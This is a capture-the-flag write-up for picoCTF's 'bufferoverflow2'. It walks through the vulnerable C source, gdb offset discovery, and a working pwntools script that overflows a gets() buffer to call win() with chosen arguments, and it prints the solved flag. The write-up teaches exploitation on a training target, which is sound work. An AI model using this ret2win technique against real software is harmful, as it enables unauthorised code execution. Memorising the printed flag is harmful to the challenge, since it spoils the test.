---
layout: post
title:  "bufferoverflow2"
grouped_by: picobin
---
### Description
> Control the return address and arguments
This time you'll need to control the arguments to the function you return to! Can you get the flag from this program?
You can view source here. And connect with it using nc saturn.picoctf.net 63353
## Analysis

We first look into the vuln.c program attached to the challenge.
```c
...
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
   
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
...
```
We see that the flag we want is in the `win` function which has not been called in main. Howvere the `vuln` function has been called and it goes use `gets()` which we can exploit using buffer overflow.   
Also to note is `win` takes two arguments and checks it to be equal to `0xCAFEF00D` and `0xF00DF00D` respectively.

Buffer size is declared to be 100.
We also look into compile protections in place for the executable



```c
 [ctf] chmod +x vuln                                                                                                                    
[ctf] gdb vuln                                                                                                                     
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 9.1 in 0.00ms using Python engine 3.8
Reading symbols from vuln...
(No debugging symbols found in vuln)
gef➤  checksec
[+] checksec for '/tmp/ctf/vuln'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
gef➤
```
Only NX is active which prevents us from putting in shellcode in the stack. Thats fine, we can move ahead.



## Solution

We need to now find how many bytes to overflow till we reach the eip address in stack. For this I'm trying a random input pattern generated by gdb and find the offset where eip is overwritten

```c
gef➤  pattern create 250
[+] Generating a pattern of 250 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma
[+] Saved as '$_gef0'
gef➤  c
Continuing.
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfb
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffcd00  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fbc000  →  0x001ead6c
$edi   : 0xf7fbc000  →  0x001ead6c
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd00│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"    ← $esp
0xffffcd04│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffcd08│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffcd0c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffcd10│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffcd14│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffcd18│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffcd1c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset 0x62616164
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```

From the above result we know the offset to be 112. After whihc, we'll be overwriting the instruction pointer. We can now give in the address for `win` function along with the arguments to match and give us the flag.


Since we know theres a signal_handler and an alarm, in gdb we can set to ignore SIGALRM and run the program. It should now not stop the program and give us the key.

To find the address of win we do the following

```c
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x080490e0  printf@plt
0x080490f0  gets@plt
0x08049100  fgets@plt
0x08049110  getegid@plt
0x08049120  puts@plt
0x08049130  exit@plt
0x08049140  __libc_start_main@plt
0x08049150  setvbuf@plt
0x08049160  fopen@plt
0x08049170  setresgid@plt
0x08049180  _start
0x080491c0  _dl_relocate_static_pie
0x080491d0  __x86.get_pc_thunk.bx
0x080491e0  deregister_tm_clones
0x08049220  register_tm_clones
0x08049260  __do_global_dtors_aux
0x08049290  frame_dummy
0x08049296  win
0x08049338  vuln
0x08049372  main
0x080493f0  __libc_csu_init
0x08049460  __libc_csu_fini
0x08049465  __x86.get_pc_thunk.bp
0x0804946c  _fini
```
Okay s oour input till now would be 112*<any_char> + the address of `win` in little endien order. 
Now since the function`win` is called, it needs a return address as well, so we can randomly give 4 bytes to the input as we don't care much about it. The last piece of input would be the arguments to `win` - `0xCAFEF00D` and `0xF00DF00D` in little endien format. 

Wrote a small python code to get this job done on the server
```c
import sys
from pwn import *
payload = b'a'*112 + b'\x96\x92\x04\x08abcd\x0D\xF0\xFE\xCA\x0D\xF0\x0D\xF0'

session = remote(sys.argv[1], sys.argv[2])
session.recvuntil("Please enter your string:")
session.sendline(payload)
session.recv()
session.interactive()
```
```
[ctf] python payload.py saturn.picoctf.net 58479                                                                                                                                                                                                             
[+] Opening connection to saturn.picoctf.net on port 58479: Done
payload.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  session.recvuntil("Please enter your string:")
[*] Switching to interactive mode
\xpicoCTF{argum3nt5_4_d4yZ_3c04eab0}[*] Got EOF while reading in interactive
$
```

And there is our flag `picoCTF{argum3nt5_4_d4yZ_3c04eab0}`